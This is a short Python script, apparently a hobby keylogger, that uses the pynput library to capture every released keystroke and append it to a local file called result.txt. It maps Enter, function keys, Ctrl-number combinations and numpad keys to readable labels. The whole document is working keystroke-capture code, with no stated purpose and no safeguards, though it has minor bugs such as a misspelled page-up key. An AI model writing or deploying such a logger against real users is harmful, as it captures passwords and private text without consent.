import pynput.keyboard as Keyboard

my_list = ["Key.ctrl_l", "Key.shift", "Key.esc", "Key.shift_r"]
enter = "Key.enter"
space = "Key.space"
backspace = "Key.backspace"
clicked_click = []

# Example keys
ctrl_keys = {
    "<49>": "ctrl + 1",
    "<50>": "ctrl + 2",
    "<51>": "ctrl + 3",
    "<52>": "ctrl + 4",
    "<53>": "ctrl + 5",
    "<54>": "ctrl + 6",
    "<55>": "ctrl + 7",
    "<56>": "ctrl + 8",
    "<57>": "ctrl + 9",
    "<48>": "ctrl + 0",
    "<189>": "ctrl + -",
    "<187>": "ctrl + =",
}

f_keys = {
    "Key.f1": "F1",
    "Key.f2": "F2",
    "Key.f3": "F3",
    "Key.f4": "F4",
    "Key.f5": "F5",
    "Key.f6": "F6",
    "Key.f7": "F7",
    "Key.f8": "F8",
    "Key.f9": "F9",
    "Key.f10": "F10",
    "Key.f11": "F11",
    "Key.f12": "F12",
    "Key.delete": "DEL",
}

simple_keys = {
    "Key.tab": "TAB",
    "Key.caps_lock": "CAPSLOCK",
    "Key.cmd": "WINDOWS",
    "Key.alt_gr": "ALT(right)",
    "Key.alt_l": "ALT(left)",
    "Key.up": "UP",
    "Key.down": "DOWN",
    "Key.left": "LEFT",
    "Key.right": "RIGHT",
    "Key.print_screen": "SCREEN",
    "Key.insert": "INSERT",
    "Key.pause": "PAUSE",
    "Key.home": "HOME",
    "Key.end": "END",
    "Key.page_uo": "PgUp",
    "Key.page_down": "PgDn"
}

nmLk = {
    "<96>": "NUM0",
    "<97>": "NUM1",
    "<98>": "NUM2",
    "<99>": "NUM3",
    "<100>": "NUM4",
    "<101>": "NUM5",
    "<102>": "NUM6",
    "<103>": "NUM7",
    "<104>": "NUM8",
    "<105>": "NUM9",
}


def on_release(key):
    if not str(key) in my_list:
        with open("./result.txt", "a") as file:
            if str(key) == enter:
                file.write("\n" + "Enter" + "\n")
            elif str(key) == space:
                file.write(" " + "Space" + " ")
            elif str(key) == backspace:
                file.write(" " + "Backspace" + " ")
            elif str(key) in list(ctrl_keys.keys()):
                index = list(ctrl_keys.keys()).index(str(key))
                result = list(ctrl_keys.values())[index]
                file.write(str(result) + " ")
            elif str(key) in list(f_keys.keys()):
                index = list(f_keys.keys()).index(str(key))
                result = list(f_keys.values())[index]
                file.write(str(result) + " ")
            elif str(key) in list(simple_keys.keys()):
                index = list(simple_keys.keys()).index(str(key))
                result = list(simple_keys.values())[index]
                file.write(str(result) + " ")
            elif str(key) in list(nmLk.keys()):
                index = list(nmLk.keys()).index(str(key))
                result = list(nmLk.values())[index]
                file.write(str(result) + " ")
            else:
                file.write(str(key)[1])
            file.close()


with Keyboard.Listener(on_release=on_release) as listener:
    listener.join()
